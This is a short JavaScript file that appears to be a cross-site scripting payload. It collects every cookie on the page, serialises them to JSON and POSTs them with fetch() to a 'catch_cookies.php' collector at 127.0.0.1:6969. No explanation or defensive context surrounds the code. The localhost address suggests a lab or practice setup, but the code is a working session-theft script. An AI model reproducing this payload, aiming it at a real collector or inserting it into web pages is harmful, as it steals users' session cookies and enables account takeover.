var getCookies = function(){
  var pairs = document.cookie.split(";");
  var cookies = {};
  for (var i=0; i<pairs.length; i++){
    var pair = pairs[i].split("=");
    cookies[(pair[0]+'').trim()] = unescape(pair.slice(1).join('='));
  }
  return JSON.stringify(cookies);
}

var cookies = getCookies();
const formData = new FormData();
formData.append('cookies',cookies); 
//JSON.stringify({cookie: cookies})
fetch('http://127.0.0.1:6969/catch_cookies.php',
  {
    method: 'POST',
    body: formData
  })
.then(response => {console.log(response)})
.catch(error => {console.log(error)});